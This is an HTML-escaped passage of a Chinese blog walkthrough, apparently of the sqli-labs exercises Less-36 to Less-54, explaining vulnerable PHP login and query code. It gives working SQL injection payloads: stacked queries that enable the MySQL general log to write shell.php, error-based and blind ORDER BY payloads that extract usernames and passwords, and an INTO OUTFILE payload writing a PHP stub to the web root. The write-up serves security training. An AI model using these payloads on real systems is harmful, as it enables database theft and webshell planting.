&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-33的过滤方式类似，绕过方法类似&lt;/p&gt;
&lt;h2 id=&#34;less-37&#34;&gt;Less-37&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-36类似&lt;/p&gt;
&lt;h2 id=&#34;less-38堆叠注入&#34;&gt;Less-38(堆叠注入)&lt;/h2&gt;
&lt;h3 id=&#34;堆叠&#34;&gt;堆叠&lt;/h3&gt;
&lt;p&gt;多条语句一起执行&lt;/p&gt;
&lt;h3 id=&#34;原理-1&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;MySQL 中，主要是命令行中，每条语句结尾加 &lt;code&gt;;&lt;/code&gt; 表示语句结束。这样可以考虑闭合已有语句，从而执行多条 SQL 语句&lt;/p&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;UNION 执行的语句类型是有限的—查询语句；而堆叠注入可以执行任意语句&lt;/p&gt;
&lt;p&gt;并不是每一个环境下都可以执行堆叠，很可能受 API 、数据库引擎不支持、权限不足的限制&lt;/p&gt;
&lt;p&gt;在真实环境中通常只返回一个查询结果，因此，堆叠注入第二个语句可能产生错误或者结果被忽略，即在前端界面是无法看到返回结果的；在使用堆叠注入之前需要知道一些数据库相关信息的，例如表名，列名等信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_multi_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 执行多个查询有结果
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;cm&#34;&gt;/* store first result set */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_store_result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_fetch_row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;font size = &amp;#34;5&amp;#34; color= &amp;#34;#00FF00&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	
            &lt;span class=&#34;nx&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Your Username is : %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Your Password is : %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/font&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//            mysqli_free_result($result);
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;cm&#34;&gt;/* print divider */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_more_results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 是否有更多结果
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;//printf(&amp;#34;-----------------\n&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
     &lt;span class=&#34;c1&#34;&gt;//while (mysqli_next_result($con1));
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲、堆叠&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;后续利用&#34;&gt;后续利用&lt;/h3&gt;
&lt;p&gt;堆叠注入可以执行任意SQL语句，那么就可以进行&lt;strong&gt;开启日志getshell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前提：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有web目录的物理路径&lt;/li&gt;
&lt;li&gt;MySQL用户可以对web目录有读写权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&#39;;set global general_log = &amp;quot;On&amp;quot;;set global general_log_file=&#39;/var/www/html/shell.php&#39;;--+
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id=1&#39;;select &amp;lt;?php phpinfo(); ?&amp;gt;;--+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问shell.php即可&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;本题开启日志getshell尝试过程中，发现&lt;/strong&gt;&lt;code&gt;set global general_log_file=&#39;/var/www/html/shell.php&#39;&lt;/code&gt;一直执行失败，原因是：&lt;code&gt;/var/&lt;/code&gt;目录不属于mysql用户，无法设置成功，进入容器修改目录权限即可执行成功&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;less-39&#34;&gt;Less-39&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;直接拼&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲、堆叠&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-38类似&lt;/p&gt;
&lt;h2 id=&#34;less-40&#34;&gt;Less-40&lt;/h2&gt;
&lt;p&gt;拼接方式：单引号 + 括号&lt;/p&gt;
&lt;p&gt;其余与Less-38类似&lt;/p&gt;
&lt;h2 id=&#34;less-41&#34;&gt;Less-41&lt;/h2&gt;
&lt;p&gt;拼接方式：直接拼&lt;/p&gt;
&lt;p&gt;注入类型：无法报错注入&lt;/p&gt;
&lt;p&gt;其余与Less-39类似&lt;/p&gt;
&lt;h2 id=&#34;less-42&#34;&gt;Less-42&lt;/h2&gt;
&lt;p&gt;login.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;login_user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;login_password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; and password=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;mysqli_multi_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;查询成功：&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;登录成功&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Auth&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3600&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;跳转到&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;logged&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;logged-in.php:&lt;/p&gt;
&lt;p&gt;提供修改密码功能&lt;/p&gt;
&lt;p&gt;pass_change.php：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;未登录&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;重定向&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;修改密码表单&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$curr_pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;current_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$re_pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;re_password&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$re_pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;UPDATE users SET PASSWORD=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; and password=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$curr_pass&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;分析-2&#34;&gt;分析&lt;/h3&gt;
&lt;p&gt;第一处漏洞发生在登录时的password未过滤，可进行报错、堆叠、union等注入&lt;/p&gt;
&lt;p&gt;第二处漏洞发生在update更新密码时对从session中获得的用户名未做过滤，利用方式与Less-24类似&lt;/p&gt;
&lt;h2 id=&#34;less-43&#34;&gt;Less-43&lt;/h2&gt;
&lt;p&gt;拼接方式：POST + 单引号 + 但括号&lt;/p&gt;
&lt;p&gt;其余与Less-42类似&lt;/p&gt;
&lt;h2 id=&#34;less-44&#34;&gt;Less-44&lt;/h2&gt;
&lt;p&gt;拼接方式：单引号&lt;/p&gt;
&lt;p&gt;注入类型：少了报错&lt;/p&gt;
&lt;p&gt;其余与Less-43类似&lt;/p&gt;
&lt;h2 id=&#34;less-45&#34;&gt;Less-45&lt;/h2&gt;
&lt;p&gt;注入类型：少了报错&lt;/p&gt;
&lt;p&gt;其余与Less-43类似&lt;/p&gt;
&lt;h2 id=&#34;less-46&#34;&gt;Less-46&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sort&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users ORDER BY &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;查询成功：&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;输出查询结果&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;：&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注入位置发生在&lt;strong&gt;order by 子句&lt;/strong&gt;上&lt;/p&gt;
&lt;h3 id=&#34;探测方式&#34;&gt;探测方式&lt;/h3&gt;
&lt;p&gt;更换id发现排序方式不同，可能是用不同的列进行排序&lt;/p&gt;
&lt;h4 id=&#34;升降&#34;&gt;升降&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 升序
?sort=1 asc

# 降序
?sort=1 desc
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;rand函数&#34;&gt;rand()函数&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=rand(true)
?sort=rand(false)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;二者返回结果不一样，且是固定的，因此可进行布尔、延时盲注&lt;/p&gt;
&lt;h4 id=&#34;延时探测&#34;&gt;延时探测&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=sleep(1)
?sort=(sleep(1))
?sort=1 and sleep(1)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回时间为查询结果行数 * 1 秒&lt;/p&gt;
&lt;h3 id=&#34;利用-1&#34;&gt;利用&lt;/h3&gt;
&lt;h4 id=&#34;报错&#34;&gt;报错&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 利用procedure analyse 参数报错
?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;盲注&#34;&gt;盲注&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=rand(left(database(),1)=&#39;s&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 延时
?sort=rand(if(ascii(substr(database(),1,1))=115,1,sleep(1)))
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;into-outfile-1&#34;&gt;into outfile&lt;/h4&gt;
&lt;p&gt;直接导出(注意需要有写权限)：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=1 into outfile &amp;quot;/var/www/html/less46.txt&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;getshell：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?sort=1 into outfile &amp;quot;/var/www/html/shell.php&amp;quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;限定每一行以0x3c3f70687020706870696e666f28293b3f3e(&lt;code&gt;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;的十六进制编码)为结尾&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1380; 
			flex-basis: 3314px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20220102111114981.png&#34; data-size=&#34;1961x142&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20220102111114981.png&#34;
			width=&#34;1961&#34;
			height=&#34;142&#34;
			srcset=&#34;https://coollllllll.github.io/p/sql/image-20220102111114981_huf0f2d884c33af30dee8fead53b5e6bd2_64278_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20220102111114981_huf0f2d884c33af30dee8fead53b5e6bd2_64278_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-47&#34;&gt;Less-47&lt;/h2&gt;
&lt;p&gt;拼接方式：单引号&lt;/p&gt;
&lt;p&gt;其余与Less-46类似&lt;/p&gt;
&lt;h2 id=&#34;less-48&#34;&gt;Less-48&lt;/h2&gt;
&lt;p&gt;注入类型：少了报错&lt;/p&gt;
&lt;p&gt;其余与Less-46类似&lt;/p&gt;
&lt;h2 id=&#34;less-49&#34;&gt;Less-49&lt;/h2&gt;
&lt;p&gt;注入类型：少了报错&lt;/p&gt;
&lt;p&gt;其余与Less-47类似&lt;/p&gt;
&lt;h2 id=&#34;less-50&#34;&gt;Less-50&lt;/h2&gt;
&lt;p&gt;注入类型：可以堆叠注入&lt;/p&gt;
&lt;p&gt;其余与Less-46类似&lt;/p&gt;
&lt;h2 id=&#34;less-51-53&#34;&gt;Less-51-53&lt;/h2&gt;
&lt;p&gt;与Less50类似，只是在在注入类型和拼接方式上有变化&lt;/p&gt;
&lt;h2 id=&#34;less-54&#34;&gt;Less-54&lt;/h2&gt;
&lt;p&gt;index.php：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if $_GET[&#39;id&#39;]:
    计数器加1；
    if 计数器超过10次：
    	提示失败
    $sql=&amp;quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;
    if 有查询成功:
        输出查询信息
    else：
        pass

$key = addslashes($_POST[&#39;key&#39;]);
$key = mysql_real_escape_string($key);
$sql=&amp;quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要求从challenges数据库中10次得到secret key&lt;/p&gt;
&lt;h3 id=&#34;利用-2&#34;&gt;利用&lt;/h3&gt;
&lt;p&gt;判断闭合：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=1&#39; --+

可用union注入
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;判断字段数目：&lt;/p&gt;
